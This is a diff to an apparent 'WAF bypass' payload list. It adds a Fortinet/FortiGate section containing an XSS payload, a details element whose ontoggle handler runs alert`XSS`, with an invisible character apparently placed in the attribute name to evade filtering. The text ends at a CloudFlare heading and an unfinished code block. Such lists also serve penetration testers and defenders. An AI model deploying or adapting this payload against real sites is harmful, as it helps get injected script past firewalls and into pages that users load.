@@ -1,5 +1,11 @@
 # WAF bypass
 
+## Fortinet / FortiGate
+
+```
+<details open ontoggle​="(()=>alert`XSS`)()"></details>
+```
+
 ## CloudFlare
 
 ```
